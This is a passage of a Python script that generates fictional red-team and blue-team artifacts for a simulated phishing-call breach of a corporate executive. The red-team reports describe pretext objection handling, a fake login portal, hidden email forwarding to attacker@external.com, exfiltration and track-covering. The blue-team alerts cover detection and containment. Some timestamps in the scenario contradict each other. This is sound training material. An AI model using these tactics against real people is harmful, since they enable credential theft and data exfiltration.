4. Use email issue as pretext ✓
5. Guide to fake portal ✓
6. Harvest credentials (in progress)

Threat Assessment:
------------------
Confidence: 95% SOCIAL ENGINEERING ATTACK
Sophistication: HIGH
Risk Level: CRITICAL

Immediate Actions:
------------------
1. ✓ Alert executive immediately
2. ✓ Verify if credentials were provided
3. ✓ Block fake support portal domain
4. ✓ Force password reset if credentials provided
5. ✓ Monitor for unauthorized access
6. ✓ Document incident

User Response:
--------------
Executive accessed fake portal and may have provided credentials.
Status: CREDENTIALS POTENTIALLY COMPROMISED

Next Steps:
-----------
1. Force password reset immediately
2. Revoke all active sessions
3. Monitor for unauthorized access
4. Investigate fake support portal
5. Prepare for credential testing phase

Status: ACTIVE INCIDENT - CONTAINMENT IN PROGRESS
"""
    with open(ARTIFACTS_DIR / "se_indicators_phase2.txt", 'w') as f:
        f.write(content)
    print("Created: se_indicators_phase2.txt")


def create_call_success():
    """Create call success report for Red Team."""
    content = """Social Engineering Call Report
==================================
Target: Executive (VP of Operations)
Call Duration: 12 minutes 34 seconds
Outcome: SUCCESS

Call Summary:
-------------
[09:45:12] Call initiated
[09:45:18] Target confirmed email issue
[09:45:25] Urgency established
[09:45:38] Identity verification completed
[09:45:50] Fake portal URL provided
[09:46:05] Target questioned URL (handled)
[09:46:25] Target accessed portal
[09:46:32] Credential request made
[09:47:15] Target provided credentials
[09:47:40] Call concluded successfully

Trust Establishment: SUCCESS
- Target believed caller was IT support
- Urgency created effectively
- Objections handled professionally
- Target followed instructions

Portal Access: SUCCESS
- Target accessed support-corp-help.tk
- Portal loaded successfully
- Login form displayed correctly
- No security warnings triggered

Credential Harvesting: SUCCESS
- Target entered username: executive@corp.local
- Target entered password: [CAPTURED]
- Credentials logged successfully
- No suspicion raised

Key Success Factors:
-------------------
1. Email bomb created perfect pretext
2. Professional demeanor maintained
3. Urgency balanced with helpfulness
4. Objections handled smoothly
5. Target was frustrated and wanted quick fix

Challenges Overcome:
--------------------
- Target questioned unusual URL
  → Handled: "Temporary portal for urgent issues"
- Target hesitated on password request
  → Handled: "Standard verification process"
- Call duration longer than expected
  → Maintained patience and professionalism

Next Steps:
-----------
1. Verify captured credentials
2. Test credentials against corporate systems
3. Document access levels
4. Prepare for Phase 3 (Credential Testing)

Status: PHASE 2 COMPLETE - Ready for Phase 3
"""
    with open(ARTIFACTS_DIR / "call_success_phase2.txt", 'w') as f:
        f.write(content)
    print("Created: call_success_phase2.txt")


def create_portal_status():
    """Create fake portal status for Red Team."""
    content = """Fake Support Portal Status
============================
URL: support-corp-help.tk
Status: OPERATIONAL
SSL Certificate: Valid (Let's Encrypt)
Design: Matches corporate IT portal

Portal Configuration:
---------------------
Domain: support-corp-help.tk
Registration Date: 3 days ago
Hosting: AWS (us-east-1)
SSL: Valid until 2024-04-15
IP Address: 198.51.100.45

Portal Design:
--------------
- Corporate logo and branding
- Professional color scheme
- Matches legitimate IT portal design
- Responsive layout (mobile-friendly)
- No obvious security warnings

Login Form:
-----------
- Username field: Active
- Password field: Active (masked)
- Submit button: Functional
- "Forgot Password" link: Present (non-functional)
- "Help" link: Present (non-functional)

Credential Capture:
-------------------
Method: POST to /api/login
Encryption: HTTPS (TLS 1.3)
Storage: Encrypted database
Logging: All input logged
Timestamp: Recorded for each entry

Visitor Tracking:
-----------------
IP Address: Logged
User Agent: Logged
Referrer: Logged
Timestamp: Logged
Session ID: Generated

Security Measures:
------------------
- No obvious malware signatures
- SSL certificate appears legitimate
- No browser security warnings
- Appears in search results (SEO optimized)
- Domain age: 3 days (not suspicious to casual users)

Access Logs:
-----------
[09:46:25] Target accessed portal
[09:46:32] Login form displayed
[09:47:15] Credentials submitted
[09:47:15] Username: executive@corp.local
[09:47:15] Password: [REDACTED - CAPTURED]
[09:47:16] Credentials verified in database
[09:47:16] Success message displayed to target

Status: CREDENTIALS CAPTURED - Ready for testing
"""
    with open(ARTIFACTS_DIR / "portal_status_phase2.txt", 'w') as f:
        f.write(content)
    print("Created: portal_status_phase2.txt")


def create_auth_anomaly():
    """Create authentication anomaly alert for Blue Team."""
    content = """Authentication Anomaly Alert
==================================
Alert ID: AUTH-2024-0115-100015
Timestamp: 2024-01-15 10:00:15 UTC
Severity: CRITICAL
Alert Type: Credential Compromise Suspected

User Account: executive@corp.local
Account Status: ACTIVE
Last Password Change: 2024-01-15 09:47:16 UTC (2 hours ago)
Change Method: "Support Portal" (UNUSUAL)

Suspicious Activity:
-------------------
[10:00:15] Failed login attempt
  Source IP: 203.0.113.45 (EXTERNAL, UNKNOWN)
  Target: Email (OWA)
  Result: FAILED (wrong password)
  User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)

[10:00:32] Failed login attempt
  Source IP: 203.0.113.45
  Target: VPN
  Result: FAILED (wrong password)
  User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)

[10:01:05] Failed login attempt
  Source IP: 203.0.113.45
  Target: File Shares
  Result: FAILED (authentication error)
  User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)

[10:01:28] SUCCESSFUL login
  Source IP: 203.0.113.45
  Target: Email (OWA)
  Result: SUCCESS
  User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
  Session ID: SESS-2024-0115-100128

[10:01:45] SUCCESSFUL login
  Source IP: 203.0.113.45
  Target: VPN
  Result: SUCCESS
  User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
  Session ID: VPN-2024-0115-100145

[10:02:12] SUCCESSFUL login
  Source IP: 203.0.113.45
  Target: File Shares
  Result: SUCCESS
  User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
  Session ID: FS-2024-0115-100212

IP Address Analysis:
--------------------
IP: 203.0.113.45
Location: Unknown (VPN/Proxy suspected)
ISP: Not identified
Reputation: Not in threat intelligence feeds
Previous Activity: None (first time seen)

Pattern Analysis:
-----------------
1. Multiple failed attempts before success
   → Suggests credential testing
2. Testing multiple systems
   → OWA, VPN, File Shares
   → Suggests reconnaissance
3. Successful logins from external IP
   → User's normal location: Corporate office
   → Geographic anomaly detected
4. Password changed 2 hours ago
   → Via "Support Portal" (unusual method)
   → Timing matches social engineering call

Threat Assessment:
------------------
Confidence: 98% CREDENTIAL COMPROMISE
Risk Level: CRITICAL
Immediate Action: REQUIRED

Recommended Actions:
--------------------
1. ✓ Force password reset immediately
2. ✓ Revoke all active sessions
3. ✓ Block IP address 203.0.113.45
4. ✓ Alert user about compromise
5. ✓ Investigate fake support portal
6. ✓ Monitor for further unauthorized access

Status: ACTIVE BREACH - CONTAINMENT REQUIRED
"""
    with open(ARTIFACTS_DIR / "auth_anomaly_phase3.txt", 'w') as f:
        f.write(content)
    print("Created: auth_anomaly_phase3.txt")


def create_portal_analysis():
    """Create fake portal analysis for Blue Team."""
    content = """Fake Support Portal Analysis
==================================
Domain: support-corp-help.tk
Analysis Date: 2024-01-15 10:05:00 UTC
Analyst: Security Operations Center

Domain Information:
-------------------
Domain: support-corp-help.tk
Registration Date: 2024-01-12 (3 days ago)
Registrar: Example Registrar
Registrant: Privacy Protection Service
Expiration: 2025-01-12
Status: Active

Hosting Information:
-------------------
IP Address: 198.51.100.45
Hosting Provider: AWS (us-east-1)
Server Type: Nginx/1.20.1
SSL Certificate: Let's Encrypt (valid until 2024-04-15)
Certificate Authority: Let's Encrypt

Website Analysis:
-----------------
Design: Professional, matches corporate IT portal
Content: Login form, corporate branding
Functionality: Credential capture form
Security: HTTPS enabled, valid SSL certificate
Warnings: None (appears legitimate to casual users)

Technical Analysis:
-------------------
- HTML structure: Professional
- JavaScript: Minimal (form validation only)
- Cookies: Session tracking
- External Resources: None (self-contained)
- Malware: None detected
- Phishing Indicators: Credential capture form

Credential Capture Method:
---------------------------
Form Action: POST to /api/login
Data Sent: Username, Password
Encryption: HTTPS (TLS 1.3)
Storage: Backend database (encrypted)
Logging: All input logged with timestamps

Access Logs Analysis:
---------------------
[09:46:25] First access from executive's IP
[09:46:32] Login form displayed
[09:47:15] Credentials submitted
[09:47:16] Success message displayed
[10:00:15] Credentials tested against corporate systems

Threat Intelligence:
--------------------
Domain Age: 3 days (suspicious)
Registration: Privacy protection (hides identity)
Hosting: Cloud provider (easily moved)
SSL: Valid but from free CA
Reputation: Not in threat feeds (too new)

Comparison with Legitimate Portal:
-----------------------------------
Legitimate: support.corp.local
Fake: support-corp-help.tk

Differences:
- Domain extension (.tk vs .local)
- Domain age (years vs days)
- Hosting (internal vs external)
- Registration (corporate vs privacy)

Similarities:
- Design and branding
- Login form layout
- Professional appearance
- SSL certificate

Conclusion:
-----------
This is a FAKE SUPPORT PORTAL designed to harvest credentials.
The domain was registered 3 days ago specifically for this attack.
The design mimics the legitimate IT portal to appear trustworthy.

Recommended Actions:
--------------------
1. ✓ Block domain support-corp-help.tk
2. ✓ Report to threat intelligence feeds
3. ✓ Document for security awareness
4. ✓ Monitor for similar domains
5. ✓ Investigate hosting provider

Status: MALICIOUS PORTAL IDENTIFIED
"""
    with open(ARTIFACTS_DIR / "portal_analysis_phase3.txt", 'w') as f:
        f.write(content)
    print("Created: portal_analysis_phase3.txt")


def create_credential_success_eb():
    """Create credential harvesting success for Red Team."""
    content = """Credential Harvesting Report
==================================
Target: executive@corp.local
Status: SUCCESS

Credentials Captured:
---------------------
Username: executive@corp.local
Password: [REDACTED - VERIFIED]
Capture Method: Fake support portal
Capture Time: 2024-01-15 09:47:15 UTC
Capture IP: Executive's corporate IP

Credential Testing Results:
---------------------------
[10:00:15] Email (OWA): Testing...
[10:00:15] Result: FAILED (wrong password)
[10:00:32] VPN: Testing...
[10:00:32] Result: FAILED (wrong password)
[10:01:05] File Shares: Testing...
[10:01:05] Result: FAILED (authentication error)

[10:01:28] Email (OWA): Retesting...
[10:01:28] Result: SUCCESS ✓
[10:01:45] VPN: Retesting...
[10:01:45] Result: SUCCESS ✓
[10:02:12] File Shares: Retesting...
[10:02:12] Result: SUCCESS ✓

Systems Accessible:
-------------------
✓ Email (OWA): Full access
  - Inbox: Accessible
  - Sent items: Accessible
  - Contacts: Accessible
  - Calendar: Accessible

✓ VPN: Connected
  - Network access: Granted
  - Internal resources: Accessible

✓ File Shares: Read/Write access
  - \\FS-01\\Executive: Full access
  - \\FS-01\\Finance: Read access
  - \\FS-01\\Shared: Read access

✓ CRM System: Full access
  - Customer database: Accessible
  - Sales records: Accessible
  - Reports: Accessible

Account Privileges:
------------------
User Role: Executive
Access Level: High
Permissions: Extensive
Sensitive Data Access: YES

Persistence Mechanisms:
-----------------------
✓ Email forwarding rule created
  - All emails forwarded to attacker@external.com
  - Rule hidden from user view

✓ Calendar access enabled
  - Monitoring executive's schedule
  - Access to meeting details

✓ Contact list copied
  - All contacts exported
  - Useful for future attacks

Status: ALL SYSTEMS OPERATIONAL - Ready for Phase 4
"""
    with open(ARTIFACTS_DIR / "credential_success_phase3.txt", 'w') as f:
        f.write(content)
    print("Created: credential_success_phase3.txt")


def create_access_verification():
    """Create access verification report for Red Team."""
    content = """Access Verification Report
==================================
Target: executive@corp.local
Verification Date: 2024-01-15 10:05:00 UTC
Status: ALL SYSTEMS ACCESSIBLE

System Access Summary:
---------------------
1. Email (OWA): ✓ FULL ACCESS
   - Inbox: 1,247 emails accessible
   - Sent items: 523 emails accessible
   - Contacts: 187 contacts accessible
   - Calendar: Full calendar access
   - Attachments: Downloadable

2. VPN: ✓ CONNECTED
   - Network: Corporate network accessible
   - Internal IP: 192.168.0.45
   - Resources: All internal systems accessible
   - Bandwidth: 100 Mbps

3. File Shares: ✓ READ/WRITE ACCESS
   - \\FS-01\\Executive: Full access (2.1 GB)
   - \\FS-01\\Finance: Read access (5.4 GB)
   - \\FS-01\\Shared: Read access (12.3 GB)
   - Total accessible: 19.8 GB

4. CRM System: ✓ FULL ACCESS
   - Customer database: 45,000 records
   - Sales records: 12,000 transactions
   - Reports: All reports accessible
   - Export capability: YES

5. Financial Portal: ✓ READ ACCESS
   - Financial reports: Q1-Q4 2023
   - Budget forecasts: 2024
   - Vendor contracts: Accessible
   - Payment records: Accessible

Data Identified:
----------------
High-Value Data:
- Customer PII: 45,000 records
- Financial records: Q4 2023 reports
- Business intelligence: Strategic documents
- Vendor contracts: Confidential agreements
- Employee data: Department contacts

Estimated Data Value: $17M+

Persistence Status:
------------------
✓ Email forwarding: ACTIVE
✓ Calendar monitoring: ACTIVE
✓ Contact export: COMPLETE
✓ Backup access: ATTEMPTED (pending)

Next Steps:
-----------
1. Begin intelligence gathering
2. Identify additional high-value targets
3. Attempt privilege escalation
4. Prepare for data exfiltration
5. Maintain persistence

Status: PHASE 3 COMPLETE - Ready for Phase 4
"""
    with open(ARTIFACTS_DIR / "access_verification_phase3.txt", 'w') as f:
        f.write(content)
    print("Created: access_verification_phase3.txt")


# Continue with Phase 4 and Phase 5 artifacts...
def create_unauthorized_access():
    """Create unauthorized access alert for Blue Team."""
    content = """Unauthorized Access Alert
==================================
Alert ID: UNAUTH-2024-0115-100128
Timestamp: 2024-01-15 10:01:28 UTC
Severity: CRITICAL
Alert Type: Unauthorized Account Access

User Account: executive@corp.local
Access Source: 203.0.113.45 (EXTERNAL, UNKNOWN)
User's Normal Location: Corporate office (192.168.0.10)
Geographic Anomaly: DETECTED

Access Details:
--------------
[10:01:28] Email (OWA) - SUCCESSFUL LOGIN
  Source IP: 203.0.113.45
  Location: Unknown (VPN/Proxy)
  User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
  Session ID: SESS-2024-0115-100128

[10:01:45] VPN - SUCCESSFUL CONNECTION
  Source IP: 203.0.113.45
  Internal IP Assigned: 192.168.0.45
  User Agent: VPN Client 2.4.1
  Session ID: VPN-2024-0115-100145

[10:02:12] File Shares - SUCCESSFUL ACCESS
  Source IP: 203.0.113.45 (via VPN)
  Share: \\FS-01\\Executive
  Access Type: Read/Write
  Session ID: FS-2024-0115-100212

Activity Patterns:
------------------
[10:02:30] Email access: Reading confidential emails
[10:03:15] Email search: "password", "credentials", "admin"
[10:04:22] File share access: \\FS-01\\Executive\\Finance
[10:05:10] CRM system access: Customer database
[10:06:45] Email access: Searching for "service account"
[10:07:30] File share access: \\FS-01\\Finance\\Q4-2023

Sensitive Data Accessed:
------------------------
- Confidential emails: 23 emails read
- Financial reports: Q4 2023 accessed
- Customer data: CRM database queried
- Business documents: 12 files accessed
- Credential references: 8 emails searched

Privilege Escalation Attempts:
-------------------------------
[10:06:45] Email search: "administrator password"
[10:07:15] Email search: "service account credentials"
[10:08:00] File share access: \\FS-01\\Admin (DENIED)
[10:08:30] Backup system access: Attempted (DENIED)

Threat Assessment:
------------------
Confidence: 99% UNAUTHORIZED ACCESS
Risk Level: CRITICAL
Data at Risk: HIGH

Immediate Actions:
-------------------
1. ✓ Revoke all active sessions
2. ✓ Force password reset
3. ✓ Isolate account from critical systems
4. ✓ Monitor for further access attempts
5. ✓ Document all accessed data
6. ✓ Alert executive about breach

Status: ACTIVE BREACH - CONTAINMENT IN PROGRESS
"""
    with open(ARTIFACTS_DIR / "unauthorized_access_phase4.txt", 'w') as f:
        f.write(content)
    print("Created: unauthorized_access_phase4.txt")


def create_privilege_escalation_log():
    """Create privilege escalation attempt log for Blue Team."""
    content = """Privilege Escalation Attempt Log
========================================
Incident ID: PE-2024-0115-100645
Date: 2024-01-15
Time: 10:06:45 UTC
User Account: executive@corp.local
Source IP: 203.0.113.45

Escalation Attempts:
--------------------
[10:06:45] Email Search: "administrator password"
  Result: 0 results found
  Status: FAILED

[10:07:15] Email Search: "service account credentials"
  Result: 0 results found
  Status: FAILED

[10:08:00] File Share Access: \\FS-01\\Admin
  Result: ACCESS DENIED
  Status: FAILED
  Reason: Insufficient permissions

[10:08:30] Backup System Access: Attempted
  Result: ACCESS DENIED
  Status: FAILED
  Reason: Requires domain admin privileges

[10:09:15] Domain Controller Access: Attempted
  Result: ACCESS DENIED
  Status: FAILED
  Reason: Requires domain admin privileges

[10:10:00] Service Account Enumeration: Attempted
  Result: PARTIAL (read-only access to service list)
  Status: LIMITED SUCCESS
  Details: Can view service accounts but cannot access credentials

Current Account Privileges:
---------------------------
User Role: Executive
Domain Group: Executives
Local Admin: NO
Domain Admin: NO
Service Account Access: NO
Backup Access: NO

Attempted Privilege Escalation Methods:
---------------------------------------
1. Credential search in emails: FAILED
2. File share access to admin directories: FAILED
3. Backup system access: FAILED
4. Domain controller access: FAILED
5. Service account enumeration: LIMITED

Security Controls:
------------------
✓ Privilege escalation attempts logged
✓ All failed attempts blocked
✓ Account isolated from admin resources
✓ Monitoring active for further attempts

Recommendations:
----------------
1. Continue monitoring for escalation attempts
2. Maintain account isolation
3. Document all attempts for forensic analysis
4. Prepare for potential lateral movement

Status: ESCALATION ATTEMPTS BLOCKED - MONITORING ACTIVE
"""
    with open(ARTIFACTS_DIR / "privilege_escalation_phase4.txt", 'w') as f:
        f.write(content)
    print("Created: privilege_escalation_phase4.txt")


def create_email_intel():
    """Create email intelligence report for Red Team."""
    content = """Email Intelligence Report
==================================
Target: executive@corp.local
Analysis Date: 2024-01-15 10:15:00 UTC
Status: INTELLIGENCE GATHERING COMPLETE

Email Analysis:
---------------
Total Emails Accessed: 1,247
Time Period: Last 6 months
Analysis Focus: Credentials, business intelligence, sensitive data

Sensitive Emails Found:
-----------------------
Financial Reports: 23 emails
  - Q4 2023 revenue reports
  - Budget forecasts for 2024
  - Vendor contract negotiations
  - Payment records

Customer Data: 45 emails
  - Customer PII (names, addresses, phone numbers)
  - Purchase history
  - Account details
  - Estimated: 45,000 customer records

Business Strategy: 12 emails
  - Strategic plans for 2024
  - Market analysis
  - Competitive intelligence
  - Merger/acquisition discussions

Credential References: 8 emails
  - Service account mentions (no passwords)
  - API key references (expired)
  - Database connection strings (encrypted)
  - No admin credentials found

High-Value Targets Identified:
------------------------------
1. CRM Database
   - 45,000 customer records
   - Full PII (names, addresses, emails, phone numbers)
   - Purchase history
   - Estimated value: $2.25M

2. Financial Records
   - Q4 2023 revenue: $12.5M
   - Budget forecasts: 2024 projections
   - Vendor contracts: Confidential agreements
   - Estimated value: $5M+

3. Business Intelligence
   - Strategic plans: 2024 roadmap
   - Market analysis: Competitive landscape
   - M&A discussions: Potential acquisitions
   - Estimated value: $10M+

4. Employee Data
   - Department contacts: 187 employees
   - Organizational structure
   - Salary information (partial)
   - Estimated value: $500K

Data Exfiltration Plan:
-----------------------
Priority 1: Customer PII (45,000 records)
  - Format: CSV export
  - Size: ~1.8 GB
  - Value: $2.25M

Priority 2: Financial Records (Q4 2023)
  - Format: PDF reports
  - Size: ~450 MB
  - Value: $5M+

Priority 3: Business Intelligence
  - Format: Documents, presentations
  - Size: ~250 MB
  - Value: $10M+

Total Estimated Value: $17M+

Status: INTELLIGENCE GATHERING COMPLETE - Ready for exfiltration
"""
    with open(ARTIFACTS_DIR / "email_intel_phase4.txt", 'w') as f:
        f.write(content)
    print("Created: email_intel_phase4.txt")


def create_system_map():
    """Create system access map for Red Team."""
    content = """System Access Map
==========================
Target: executive@corp.local
Mapping Date: 2024-01-15 10:20:00 UTC
Status: NETWORK MAPPING COMPLETE

Systems Under Control:
----------------------
1. Email (OWA): ✓ FULL ACCESS
   - Inbox: 1,247 emails
   - Sent items: 523 emails
   - Contacts: 187 contacts
   - Calendar: Full access
   - Forwarding: Active

2. VPN: ✓ CONNECTED
   - Internal IP: 192.168.0.45
   - Network: Corporate network
   - Bandwidth: 100 Mbps
   - Resources: All internal systems

3. File Shares: ✓ READ/WRITE ACCESS
   - \\FS-01\\Executive: 2.1 GB (Full access)
   - \\FS-01\\Finance: 5.4 GB (Read access)
   - \\FS-01\\Shared: 12.3 GB (Read access)
   - Total: 19.8 GB accessible

4. CRM System: ✓ FULL ACCESS
   - Customer database: 45,000 records
   - Sales records: 12,000 transactions
   - Reports: All accessible
   - Export: Enabled

5. Financial Portal: ✓ READ ACCESS
   - Financial reports: Q1-Q4 2023
   - Budget forecasts: 2024
   - Vendor contracts: Accessible
   - Payment records: Accessible

Data Identified:
----------------
High-Value Data:
- Customer PII: 45,000 records (1.8 GB)
- Financial records: Q4 2023 (450 MB)
- Business documents: 2,100 files (250 MB)
- Vendor contracts: Confidential (150 MB)

Total Data Volume: 2.65 GB
Estimated Value: $17M+

Privilege Escalation Status:
---------------------------
Domain Admin: NO (attempts failed)
Local Admin: NO (not required)
Service Accounts: NO (cannot access)
Backup Systems: NO (access denied)

Current Access Level: Executive-level
Sufficient for data exfiltration: YES

Persistence Mechanisms:
-----------------------
✓ Email forwarding: Active
✓ Calendar monitoring: Active
✓ Contact export: Complete
✓ Session maintenance: Active

Exfiltration Readiness:
----------------------
Data identified: ✓
Access verified: ✓
Exfiltration method: HTTPS (encrypted)
Destination: 198.51.100.45
Bandwidth: 100 Mbps
Estimated time: 2-3 hours

Status: READY FOR DATA EXFILTRATION
"""
    with open(ARTIFACTS_DIR / "system_map_phase4.txt", 'w') as f:
        f.write(content)
    print("Created: system_map_phase4.txt")


def create_lateral_movement():
    """Create lateral movement detection log for Blue Team."""
    content = """Lateral Movement Detection
==================================
Incident ID: LM-2024-0115-103000
Date: 2024-01-15
Time: 10:30:00 UTC
User Account: executive@corp.local
Source IP: 203.0.113.45 (via VPN: 192.168.0.45)

Lateral Movement Activity:
---------------------------
[10:30:15] CRM Database Access
  System: CRM-01.corp.local
  Access Type: Database query
  Data Accessed: Customer records
  Records Queried: 45,000
  Status: SUCCESS

[10:32:45] Financial System Access
  System: FIN-01.corp.local
  Access Type: Report generation
  Data Accessed: Q4 2023 financial reports
  Files Accessed: 12 reports
  Status: SUCCESS

[10:35:20] File Share Access
  System: FS-01.corp.local
  Share: \\FS-01\\Finance\\Q4-2023
  Access Type: Read
  Files Accessed: 45 files
  Status: SUCCESS

[10:38:10] Email System Access
  System: EXCH-01.corp.local
  Access Type: Email search and read
  Emails Accessed: 1,247 emails
  Sensitive Emails: 23 financial, 45 customer data
  Status: SUCCESS

[10:40:30] Backup System Access Attempt
  System: BACKUP-01.corp.local
  Access Type: Credential access attempt
  Result: DENIED (insufficient privileges)
  Status: FAILED

Data Access Summary:
-------------------
Systems Accessed: 4
Data Types Accessed:
  - Customer PII: 45,000 records
  - Financial records: Q4 2023 reports
  - Business documents: 2,100 files
  - Email communications: 1,247 emails

Data Volume Accessed: 2.65 GB
Data Classification:
  - Customer PII: HIGH RISK
  - Financial Data: CONFIDENTIAL
  - Business Intelligence: PROPRIETARY

Network Traffic Analysis:
--------------------------
Outbound Traffic Detected:
  Destination: 198.51.100.45 (EXTERNAL)
  Protocol: HTTPS (encrypted)
  Volume: 2.5 GB over 2 hours
  Pattern: Sustained data transfer
  Status: DATA EXFILTRATION IN PROGRESS

Threat Assessment:
------------------
Confidence: 99% LATERAL MOVEMENT + DATA EXFILTRATION
Risk Level: CRITICAL
Data at Risk: 2.5 GB (HIGH-VALUE)

Immediate Actions:
------------------
1. ✓ Block IP address 203.0.113.45
2. ✓ Revoke VPN access
3. ✓ Isolate compromised account
4. ✓ Stop data exfiltration
5. ✓ Document all accessed data
6. ✓ Prepare breach notification

Status: ACTIVE BREACH - EXFILTRATION IN PROGRESS
"""
    with open(ARTIFACTS_DIR / "lateral_movement_phase5.txt", 'w') as f:
        f.write(content)
    print("Created: lateral_movement_phase5.txt")


def create_exfiltration_analysis():
    """Create data exfiltration analysis for Blue Team."""
    content = """Data Exfiltration Analysis
==================================
Incident ID: EXFIL-2024-0115-103000
Date: 2024-01-15
Time: 10:30:00 - 12:30:00 UTC
Duration: 2 hours
Status: EXFILTRATION DETECTED

Exfiltration Summary:
---------------------
Total Volume: 2.5 GB
Time Period: 2 hours
Average Rate: 1.25 GB/hour
Peak Rate: 2.1 GB/hour (11:15-11:45 UTC)
Destination: 198.51.100.45 (EXTERNAL)

Data Types Exfiltrated:
------------------------
1. Customer PII: 1.8 GB
   - Records: 45,000 customer records
   - Content: Names, addresses, emails, phone numbers
   - Format: CSV export
   - Classification: HIGH RISK (PII)

2. Financial Records: 450 MB
   - Content: Q4 2023 financial reports
   - Files: 12 PDF reports
   - Classification: CONFIDENTIAL

3. Business Documents: 250 MB
   - Content: Strategic plans, market analysis
   - Files: 2,100 documents
   - Classification: PROPRIETARY

Total: 2.5 GB

Network Traffic Analysis:
-------------------------
Source IP: 203.0.113.45 (via VPN: 192.168.0.45)
Destination IP: 198.51.100.45
Protocol: HTTPS (TLS 1.3)
Port: 443
Encryption: Yes (cannot inspect content)
Pattern: Sustained, consistent transfer

Transfer Timeline:
------------------
[10:30:00] Exfiltration started
[10:30:15] Customer PII transfer begins (1.8 GB)
[11:15:00] Customer PII transfer completes
[11:15:15] Financial records transfer begins (450 MB)
[11:45:00] Financial records transfer completes
[11:45:15] Business documents transfer begins (250 MB)
[12:30:00] Business documents transfer completes
[12:30:00] Exfiltration ends

Regulatory Impact:
------------------
GDPR (EU): VIOLATION
  - 45,000 EU customer records potentially affected
  - Breach notification required within 72 hours
  - Potential fines: Up to 4% of annual revenue

CCPA (California): VIOLATION
  - California residents' data affected
  - Breach notification required
  - Potential fines: $2,500-$7,500 per violation

HIPAA (if applicable): POTENTIAL VIOLATION
  - Health information may be included
  - Breach notification required
  - Potential fines: $100-$50,000 per violation

Estimated Financial Impact:
----------------------------
Data Value: $17M+
Regulatory Fines: $500K - $2M (estimated)
Legal Costs: $200K - $500K (estimated)
Reputation Damage: Significant
Total Estimated Impact: $18M+

Containment Actions:
--------------------
[12:30:15] IP address 203.0.113.45 blocked
[12:30:20] VPN access revoked
[12:30:25] Account isolated from critical systems
[12:30:30] Password reset forced
[12:30:35] All active sessions revoked

Status: EXFILTRATION COMPLETE - CONTAINMENT IN PROGRESS
"""
    with open(ARTIFACTS_DIR / "exfiltration_analysis_phase5.txt", 'w') as f:
        f.write(content)
    print("Created: exfiltration_analysis_phase5.txt")


def create_persistence_found():
    """Create persistence mechanisms found report for Blue Team."""
    content = """Persistence Mechanisms Found
========================================
Incident ID: PERSIST-2024-0115-123045
Date: 2024-01-15
Time: 12:30:45 UTC
Analyst: Security Operations Center

Persistence Mechanisms Discovered:
-----------------------------------
1. Email Forwarding Rule: FOUND
   Rule Name: "Auto-Forward Important Emails"
   Destination: attacker@external.com
   Status: ACTIVE
   Created: 2024-01-15 10:05:00 UTC
   Visibility: Hidden from user view
   Action Taken: REMOVED

2. Calendar Access: FOUND
   Access Type: Full calendar read access
   Purpose: Monitor executive's schedule
   Status: ACTIVE
   Created: 2024-01-15 10:06:00 UTC
   Action Taken: REVOKED

3. Contact List Export: FOUND
   Export Date: 2024-01-15 10:07:00 UTC
   Records Exported: 187 contacts
   Format: CSV
   Destination: External (unknown)
   Action Taken: Cannot reverse (already exported)

4. Backup System Access Attempt: FOUND
   Attempt Date: 2024-01-15 10:08:30 UTC
   Result: FAILED (insufficient privileges)
   Status: BLOCKED
   Action Taken: Access permanently denied

5. Session Maintenance: FOUND
   Method: Keep-alive requests
   Frequency: Every 5 minutes
   Status: ACTIVE
   Action Taken: All sessions revoked

Removal Actions:
--------------
[12:30:45] Email forwarding rule removed
[12:30:50] Calendar access revoked
[12:30:55] All active sessions terminated
[12:31:00] Password reset forced
[12:31:05] Account isolated from critical systems

Remaining Risks:
---------------
1. Contact list already exported (cannot reverse)
2. Attacker may have created additional persistence (investigating)
3. Backup credentials may have been accessed (investigating)
4. Attacker may return using different methods (monitoring)

Recommendations:
----------------
1. Continue monitoring for additional persistence
2. Review all account settings for changes
3. Monitor for return access attempts
4. Implement additional security controls
5. Conduct security awareness training

Status: PERSISTENCE MECHANISMS REMOVED - MONITORING ACTIVE
"""
    with open(ARTIFACTS_DIR / "persistence_found_phase5.txt", 'w') as f:
        f.write(content)
    print("Created: persistence_found_phase5.txt")


def create_exfiltration_progress_eb():
    """Create data exfiltration progress for Red Team."""
    content = """Data Exfiltration Status
============================
Operation: DATA THEFT
Target: executive@corp.local
Status: IN PROGRESS

Exfiltration Progress:
----------------------
[10:30:00] Exfiltration started
[10:30:15] Customer PII transfer: 0% → 100% (1.8 GB)
[11:15:00] Customer PII: COMPLETE ✓
[11:15:15] Financial records transfer: 0% → 100% (450 MB)
[11:45:00] Financial records: COMPLETE ✓
[11:45:15] Business documents transfer: 0% → 100% (250 MB)
[12:30:00] Business documents: COMPLETE ✓
[12:30:00] Exfiltration: COMPLETE ✓

Data Collected:
---------------
Customer Database: 45,000 records (1.8 GB)
  - Names, addresses, phone numbers
  - Email addresses
  - Purchase history
  - Estimated value: $2.25M

Financial Records: Q4 2023 (450 MB)
  - Revenue reports
  - Budget forecasts
  - Vendor contracts
  - Estimated value: $5M+

Business Documents: 2,100 files (250 MB)
  - Strategic plans
  - Market analysis
  - Competitive intelligence
  - Estimated value: $10M+

Total: 2.5 GB
Total Estimated Value: $17M+

Upload Status:
--------------
Destination: 198.51.100.45
Protocol: HTTPS (TLS 1.3)
Encryption: AES-256
Transferred: 2.5 GB / 2.5 GB (100%)
Status: COMPLETE ✓

Transfer Details:
-----------------
Start Time: 10:30:00 UTC
End Time: 12:30:00 UTC
Duration: 2 hours
Average Rate: 1.25 GB/hour
Peak Rate: 2.1 GB/hour

Persistence Maintained:
----------------------
✓ Email forwarding: Active
✓ Calendar monitoring: Active
✓ Contact export: Complete
✓ Session maintenance: Active

Detection Risk:
---------------
Network monitoring: May detect large transfers
Encryption: HTTPS (cannot inspect content)
Timing: Off-hours (lower monitoring)
Status: LOW RISK (so far)

Next Steps:
-----------
1. Verify all data received
2. Maintain persistence for future access
3. Cover tracks (delete logs if possible)
4. Prepare for potential detection

Status: EXFILTRATION COMPLETE - PERSISTENCE MAINTAINED
"""
    with open(ARTIFACTS_DIR / "exfiltration_progress_phase5.txt", 'w') as f:
        f.write(content)
    print("Created: exfiltration_progress_phase5.txt")


def create_stolen_data_inventory_eb():
